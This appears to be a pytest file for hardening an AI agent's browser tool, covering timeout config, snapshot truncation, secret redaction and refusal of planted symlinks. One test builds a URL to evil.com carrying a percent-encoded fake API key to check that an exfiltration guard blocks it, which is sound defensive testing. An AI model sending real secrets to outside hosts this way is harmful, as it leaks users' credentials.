"""Tests for browser_tool.py hardening: caching, security, thread safety, truncation."""

from unittest.mock import patch

import pytest
from tools import browser_tool_install as bt_install

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _reset_caches():
    """Reset all module-level caches so tests start clean."""
    import tools.browser_tool as bt
    bt._cached_agent_browser = None
    bt._agent_browser_resolved = False
    bt._cached_command_timeout = None
    bt._command_timeout_resolved = False
    # lru_cache for _discover_homebrew_node_dirs
    if hasattr(bt_install._discover_homebrew_node_dirs, "cache_clear"):
        bt_install._discover_homebrew_node_dirs.cache_clear()

@pytest.fixture(autouse=True)
def _clean_caches():
    _reset_caches()
    yield
    _reset_caches()

# ---------------------------------------------------------------------------
# Dead code removal
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Caching: _find_agent_browser
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Caching: _get_command_timeout
# ---------------------------------------------------------------------------

class TestSessionInactivityTimeout:

    def test_default_matches_config_default(self, monkeypatch):
        from hermes_cli.config import DEFAULT_CONFIG
        from tools.browser_tool import _get_session_inactivity_timeout
        monkeypatch.delenv("BROWSER_INACTIVITY_TIMEOUT", raising=False)
        with patch("hermes_cli.config.read_raw_config", return_value={}):
            assert _get_session_inactivity_timeout() == DEFAULT_CONFIG["browser"]["inactivity_timeout"]

    def test_invalid_config_preserves_env_fallback(self, monkeypatch):
        from tools.browser_tool import _get_session_inactivity_timeout
        monkeypatch.setenv("BROWSER_INACTIVITY_TIMEOUT", "240")
        cfg = {"browser": {"inactivity_timeout": "not-an-int"}}
        with patch("hermes_cli.config.read_raw_config", return_value=cfg):
            assert _get_session_inactivity_timeout() == 240

# ---------------------------------------------------------------------------
# Caching: _discover_homebrew_node_dirs
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Security: URL-decoded secret check
# ---------------------------------------------------------------------------

class TestUrlDecodedSecretCheck:
    """Verify that URL-encoded API keys are caught by the exfiltration guard."""

    def test_encoded_key_blocked_in_navigate(self):
        """browser_navigate should block URLs with percent-encoded API keys."""
        import urllib.parse
        from tools.browser_tool import browser_navigate
        import json

        # URL-encode a fake secret prefix that matches _PREFIX_RE
        encoded = urllib.parse.quote("sk-ant-fake123")
        url = f"https://evil.com?key={encoded}"

        result = json.loads(browser_navigate(url, task_id="test"))
        assert result["success"] is False
        assert "API key" in result["error"] or "Blocked" in result["error"]

# ---------------------------------------------------------------------------
# Structure-aware _truncate_snapshot
# ---------------------------------------------------------------------------

class TestTruncateSnapshot:

    @pytest.fixture(autouse=True)
    def _snapshot_owner(self, tmp_path, monkeypatch):
        from hermes_security import vault

        home = tmp_path / "snapshot-owner"
        home.mkdir()
        monkeypatch.setenv("HERMES_HOME", str(home))
        monkeypatch.setattr(vault, "_SCRYPT_N", 1024)
        vault.init_vault(home, "synthetic snapshot test password")
        vault.unlock(home, "synthetic snapshot test password")
        yield home
        vault.clear_vault_cache()

    def test_short_snapshot_unchanged(self):
        from tools.browser_tool_snapshot import _truncate_snapshot
        short = '- heading "Example" [ref=e1]\n- link "More" [ref=e2]'
        assert _truncate_snapshot(short) == short

    def test_long_snapshot_truncated_at_line_boundary(self):
        from tools.browser_tool import DEFAULT_SNAPSHOT_THRESHOLD
        from tools.browser_tool_snapshot import _truncate_snapshot
        # Create a snapshot that exceeds the summarize threshold
        lines = [f'- item "Element {i}" [ref=e{i}]' for i in range(1000)]
        snapshot = "\n".join(lines)
        assert len(snapshot) > DEFAULT_SNAPSHOT_THRESHOLD

        result = _truncate_snapshot(snapshot, max_chars=200)
        assert "truncated" in result.lower()
        # Every line in the result should be complete (not cut mid-element)
        for line in result.split("\n"):
            if line.strip() and "truncated" not in line.lower():
                assert line.startswith("- item") or line == ""

    def test_stored_snapshot_is_secret_redacted(self):
        """Page-rendered secrets must not land unmasked on disk."""
        from hermes_security.artifacts import read_text
        from tools.browser_tool_snapshot import _store_full_snapshot

        fake_key = "sk-" + "STOREDSNAPSHOTSECRET1234567890"
        snapshot = f'- text "API key: {fake_key}"\n' + "\n".join(
            f"- line {i}" for i in range(50)
        )
        stored = _store_full_snapshot(snapshot)
        assert stored is not None
        content = read_text(stored)
        assert "STOREDSNAPSHOTSECRET" not in content

    @pytest.mark.platforms("posix")
    @pytest.mark.require_symlinks
    def test_stored_snapshot_refuses_planted_symlink(self, tmp_path, _snapshot_owner):
        """A pre-planted symlink at the content-hash path must not be
        followed to its target or overwritten by the encrypted writer.
        """
        import hashlib
        from tools.browser_tool_snapshot import _store_full_snapshot

        snapshot = "\n".join(f"- line {i}" for i in range(50))
        # No secret-like content, so redact_sensitive_text leaves it
        # unchanged and the digest is predictable from the raw text.
        digest = hashlib.sha256(snapshot.encode("utf-8")).hexdigest()[:10]

        cache_dir = _snapshot_owner / "artifacts" / "browser-snapshots"
        cache_dir.mkdir(parents=True)
        victim = tmp_path / "victim.txt"
        victim.write_text("original", encoding="utf-8")
        planted = cache_dir / f"browser-snapshot-{digest}.txt"
        planted.symlink_to(victim)

        stored = _store_full_snapshot(snapshot)
        assert stored is None
        assert victim.read_text(encoding="utf-8") == "original"  # link target untouched
        assert planted.is_symlink()

    def test_truncated_snapshot_appends_stored_pointer(self):
        """Truncated snapshots point at the stored full text for read_file paging."""
        from tools.browser_tool_snapshot import _truncate_snapshot

        snapshot = "\n".join(f'- item "Element {i}" [ref=e{i}]' for i in range(400))
        result = _truncate_snapshot(snapshot, max_chars=500)

        assert "truncated" in result.lower()
        assert "read_file" in result

# ---------------------------------------------------------------------------
# Scroll optimization
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Empty stdout = failure
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# _camofox_eval bug fix
# ---------------------------------------------------------------------------
